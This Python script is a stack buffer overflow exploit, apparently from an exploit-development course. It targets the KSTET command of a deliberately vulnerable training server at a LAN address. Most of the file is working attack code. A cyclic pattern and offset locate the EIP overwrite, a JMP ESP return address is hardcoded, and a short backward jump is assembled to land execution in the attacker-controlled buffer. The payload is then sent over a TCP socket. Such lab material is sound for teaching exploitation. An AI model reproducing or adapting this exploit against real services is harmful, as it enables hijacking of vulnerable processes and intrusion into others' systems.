# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

import sys
import socket

#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A

#evilString = "A" * 700
evilString = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
#root@kali-rolling-amd64:~/Documents/exploitdev-udemy# msf-pattern_offset -q 63413363
#[*] Exact match at offset 70
evilString = "A" * 70 + "B" * 4 + "C" * (700-74)
# 626011c7 is the return address given by jmpcall
# \xc7\x11\x60\x62

# Search for instruction on executing short jump back 90 bytes to move back
#nasm > jmp $-90
#00000000  EBA4              jmp short 0xffffffa6
# We later learned that it jumped back too far before the start of the buffer in the EAX register so we adjust the jmp to 70 bytes instead to land directly in EAX register
#nasm > jmp $-70
#00000000  EBB8              jmp short 0xffffffba


# With proper JMP ESP instruction, now additional jmps can be fed directly after.
# Remember that after you jump to ESP, you can feed jmp commands directly without little-endianizing the hex value, which only is applied to the memory address fed into EIP

# The author made a error  for the jmp esp address, it's \x50 not \x60
evilString = "A" * 70 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command2)
s.close()
